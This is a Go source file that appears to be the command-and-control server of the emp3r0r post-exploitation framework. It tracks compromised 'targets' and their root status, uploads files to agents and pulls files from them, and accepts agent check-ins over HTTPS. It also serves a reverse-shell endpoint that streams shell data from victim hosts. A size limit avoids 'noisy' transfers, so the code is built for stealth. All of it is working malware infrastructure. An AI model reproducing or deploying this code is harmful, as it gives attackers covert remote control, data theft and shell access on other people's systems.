package cc

import (
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"

	"github.com/fatih/color"
	"github.com/jm33-m0/emp3r0r/emagent/internal/agent"
	"github.com/jm33-m0/emp3r0r/emagent/internal/tun"
	"github.com/posener/h2conn"
)

var (
	// EmpRoot root directory of emp3r0r
	EmpRoot, _ = os.Getwd()

	// Targets target list, with control (tun) interface
	Targets = make(map[*agent.SystemInfo]*Control)

	// ShellRecvBuf h2conn buffered here
	ShellRecvBuf = make(chan []byte)
)

const (
	// Temp where we save temp files
	Temp = "/tmp/emp3r0r/"

	// WWWRoot host static files for agent
	WWWRoot = Temp + tun.FileAPI

	// FileGetDir where we save #get files
	FileGetDir = "/tmp/emp3r0r/file-get/"
)

// Control controller interface of a target
type Control struct {
	Index int
	Conn  *h2conn.Conn
}

// ListTargets list currently connected targets
func ListTargets() {
	color.Cyan("Connected targets\n")
	color.Cyan("=================\n\n")

	indent := strings.Repeat(" ", len(" [0] "))
	hasroot := color.HiRedString("NO")
	for target, control := range Targets {
		if target.HasRoot {
			hasroot = color.HiGreenString("YES")
		}
		fmt.Printf(" [%s] Tag: %s (root: %v):"+
			"\n%sCPU: %s"+
			"\n%sMEM: %s"+
			"\n%sOS: %s"+
			"\n%sKernel: %s - %s"+
			"\n%sFrom: %s"+
			"\n%sIPs: %v",
			color.CyanString("%d", control.Index), target.Tag, hasroot,
			indent, target.CPU,
			indent, target.Mem,
			indent, target.OS,
			indent, target.Kernel, target.Arch,
			indent, target.IP,
			indent, target.IPs)
	}
}

// GetTargetFromIndex find target from Targets via control index
func GetTargetFromIndex(index int) (target *agent.SystemInfo) {
	for t, ctl := range Targets {
		if ctl.Index == index {
			target = t
			break
		}
	}
	return
}

// GetTargetFromTag find target from Targets via tag
func GetTargetFromTag(tag string) (target *agent.SystemInfo) {
	for t := range Targets {
		if t.Tag == tag {
			target = t
			break
		}
	}
	return
}

// ListModules list all available modules
func ListModules() {
	color.Cyan("Available modules\n")
	color.Cyan("=================\n\n")
	for mod := range ModuleHelpers {
		color.Green("[+] " + mod)
	}
}

// Send2Agent send MsgTunData to agent
func Send2Agent(data *agent.MsgTunData, agent *agent.SystemInfo) (err error) {
	ctrl := Targets[agent]
	if ctrl == nil {
		return errors.New("Send2Agent: Target is not connected")
	}
	out := json.NewEncoder(ctrl.Conn)

	err = out.Encode(data)
	return
}

// PutFile put file to agent
func PutFile(lpath, rpath string, a *agent.SystemInfo) error {
	// open and read the target file
	f, err := os.Open(lpath)
	if err != nil {
		CliPrintError("PutFile: %v", err)
		return err
	}
	bytes, err := ioutil.ReadAll(f)
	if err != nil {
		CliPrintError("PutFile: %v", err)
		return err
	}

	// file sha256sum
	sum := sha256.Sum256(bytes)

	// file size
	size := len(bytes)
	sizemB := float32(size) / 1024 / 1024
	if sizemB > 20 {
		return errors.New("please do NOT transfer large files this way as it's too NOISY, aborting")
	}
	CliPrintWarning("\nPutFile:\nUploading '%s' to\n'%s' "+
		"on %s, agent [%d]\n"+
		"size: %d bytes (%.2fmB)\n"+
		"sha256sum: %x",
		lpath, rpath,
		a.IP, Targets[a].Index,
		size, sizemB,
		sum,
	)

	// base64 encode
	payload := base64.StdEncoding.EncodeToString(bytes)

	fileData := agent.MsgTunData{
		Payload: "FILE" + agent.OpSep + rpath + agent.OpSep + payload,
		Tag:     a.Tag,
	}

	// send
	err = Send2Agent(&fileData, a)
	if err != nil {
		CliPrintError("PutFile: %v", err)
		return err
	}
	return nil
}

// GetFile get file from agent
func GetFile(filepath string, a *agent.SystemInfo) error {
	var data agent.MsgTunData
	cmd := fmt.Sprintf("#get %s", filepath)

	data.Payload = fmt.Sprintf("cmd%s%s", agent.OpSep, cmd)
	data.Tag = a.Tag
	err := Send2Agent(&data, a)
	if err != nil {
		CliPrintError("GetFile: %v", err)
		return err
	}
	return nil
}

// TLSServer start HTTPS server
func TLSServer() {
	if _, err := os.Stat(Temp + tun.FileAPI); os.IsNotExist(err) {
		err = os.MkdirAll(Temp+tun.FileAPI, 0700)
		if err != nil {
			log.Fatal("TLSServer: ", err)
		}
	}

	http.Handle("/", http.FileServer(http.Dir("/tmp/emp3r0r/www")))

	http.HandleFunc("/"+tun.CheckInAPI, checkinHandler)
	http.HandleFunc("/"+tun.MsgAPI, tunHandler)
	http.HandleFunc("/"+tun.ReverseShellAPI, rshellHandler)

	// emp3r0r.crt and emp3r0r.key is generated by build.sh
	err := http.ListenAndServeTLS(":8000", "emp3r0r-cert.pem", "emp3r0r-key.pem", nil)
	if err != nil {
		log.Fatal(color.RedString("Start HTTPS server: %v", err))
	}
}

// receive checkin requests from agents, add them to `Targets`
func checkinHandler(wrt http.ResponseWriter, req *http.Request) {
	var target agent.SystemInfo
	jsonData, err := ioutil.ReadAll(req.Body)
	defer req.Body.Close()
	if err != nil {
		CliPrintError("checkinHandler: " + err.Error())
		return
	}

	err = json.Unmarshal(jsonData, &target)
	if err != nil {
		CliPrintError("checkinHandler: " + err.Error())
		return
	}

	// set target IP
	target.IP = req.RemoteAddr

	if !agentExists(&target) {
		inx := len(Targets)
		Targets[&target] = &Control{Index: inx, Conn: nil}
		shortname := strings.Split(target.Tag, "-")[0]
		CliPrintSuccess("\n[%d] Knock.. Knock...\n%s from %s,"+
			"running '%s'\n",
			inx, shortname, target.IP,
			target.OS)
	}
}

/*
	duplex http communication
*/

// rshellHandler handles buffered data
func rshellHandler(wrt http.ResponseWriter, req *http.Request) {
	// use h2conn
	conn, err := h2conn.Accept(wrt, req)
	if err != nil {
		CliPrintError("streamHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	ctx, cancel := context.WithCancel(req.Context())
	agent.H2Stream.Ctx = ctx
	agent.H2Stream.Cancel = cancel
	agent.H2Stream.Conn = conn
	CliPrintWarning("Got a stream connection from %s", req.RemoteAddr)

	defer func() {
		err = agent.H2Stream.Conn.Close()
		if err != nil {
			CliPrintError("streamHandler failed to close connection: " + err.Error())
		}
		CliPrintWarning("Closed stream connection from %s", req.RemoteAddr)
	}()

	for {
		data := make([]byte, agent.BufSize)
		_, err = agent.H2Stream.Conn.Read(data)
		if err != nil {
			CliPrintWarning("Disconnected: streamHandler read from RecvAgentBuf: %v", err)
			return
		}
		ShellRecvBuf <- data
	}
}

// tunHandler duplex tunnel between agent and cc
func tunHandler(wrt http.ResponseWriter, req *http.Request) {
	// use h2conn
	conn, err := h2conn.Accept(wrt, req)
	if err != nil {
		CliPrintError("tunHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}

	defer func() {
		for t, c := range Targets {
			if c.Conn == conn {
				delete(Targets, t)
				CliPrintWarning("tunHandler: agent [%d]:%s disconnected\n", c.Index, t.Tag)
				break
			}
		}
		err = conn.Close()
		if err != nil {
			CliPrintError("tunHandler failed to close connection: " + err.Error())
		}
	}()

	// talk in json
	var (
		in  = json.NewDecoder(conn)
		out = json.NewEncoder(conn)
		msg agent.MsgTunData
	)

	// Loop forever until the client hangs the connection, in which there will be an error
	// in the decode or encode stages.
	for {
		// deal with json data from agent
		err = in.Decode(&msg)
		if err != nil {
			return
		}
		// read hello from agent, set its Conn if needed, and hello back
		// close connection if agent is not responsive
		if msg.Payload == "hello" {
			err = out.Encode(msg)
			if err != nil {
				CliPrintWarning("tunHandler cannot send hello to agent [%s]", msg.Tag)
				return
			}
		}

		// process json tundata from agent
		processAgentData(&msg)

		// assign this Conn to a known agent
		agent := GetTargetFromTag(msg.Tag)
		if agent == nil {
			CliPrintWarning("tunHandler: agent not recognized")
			return
		}
		Targets[agent].Conn = conn

	}
}
